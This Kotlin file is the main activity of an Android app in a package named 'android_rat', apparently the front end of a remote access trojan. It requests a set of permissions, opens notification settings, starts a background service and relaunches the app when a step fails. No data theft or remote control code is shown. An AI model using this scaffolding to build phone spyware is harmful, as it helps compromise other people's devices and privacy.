package com.example.android_rat

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.example.android_rat.ui.theme.AndroidratTheme
import com.example.android_rat.utils.PermissionUtils

class MainActivity : ComponentActivity() {
    private val requiredPermissions: Array<String>
        get() = PermissionUtils.getRequiredPermissions()

    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        var allPermissionsGranted = true
        permissions.forEach { (permission, isGranted) ->
            if (isGranted) {
                Log.d("Permissions", "$permission was granted")
            } else {
                Log.d("Permissions", "$permission was denied")
                allPermissionsGranted = false
            }
        }

        if (allPermissionsGranted) {
            initializeFeatures()
        } else {
            Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        checkAndRequestPermissions()

        setContent {
            AndroidratTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    MainContent(
                        modifier = Modifier.padding(innerPadding),
                        onRequestPermissionsClick = { checkAndRequestPermissions() }
                    )
                }
            }
        }
    }

    private fun checkAndRequestPermissions() {
        if (PermissionUtils.areAllPermissionsGranted(this, requiredPermissions)) {
            // If all permissions are already granted, initialize features
            initializeFeatures()
        } else {
            // Request the necessary permissions
            PermissionUtils.checkAndRequestPermissions(this, requiredPermissions) { permissionsArray ->
                requestPermissionsLauncher.launch(permissionsArray)
            }
        }
    }

    private fun initializeFeatures() {
        Log.d("Permissions", "Initializing features...")
        Toast.makeText(this, "All features initialized successfully", Toast.LENGTH_SHORT).show()

        try {
            PermissionUtils.openNotificationSettings(this)
        } catch (e: Exception) {
            Log.e("Error", "Failed to open notification settings: ${e.localizedMessage}")
            restartApp()
        }

        try {
            val serviceIntent = Intent(this, MyBackgroundService::class.java)
            startService(serviceIntent)
        } catch (e: Exception) {
            Log.e("Error", "Failed to start background service: ${e.localizedMessage}")
            restartApp()
        }
    }

    private fun restartApp() {
        val restartIntent = packageManager.getLaunchIntentForPackage(packageName)
        restartIntent?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        startActivity(restartIntent)
        finish()
    }
}


@Composable
fun MainContent(
    modifier: Modifier = Modifier,
    onRequestPermissionsClick: () -> Unit
) {
    var statusMessage by remember { mutableStateOf("Waiting for permissions to proceed...") }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
    ) {
        Text(text = statusMessage)

        Spacer(modifier = Modifier.height(20.dp))

        Button(onClick = {
            statusMessage = "Re-requesting permissions..."
            onRequestPermissionsClick()
        }) {
            Text(text = "Request Permissions")
        }
    }
}

@Preview(showBackground = true)
@Composable
fun MainContentPreview() {
    AndroidratTheme {
        MainContent(onRequestPermissionsClick = {})
    }
}
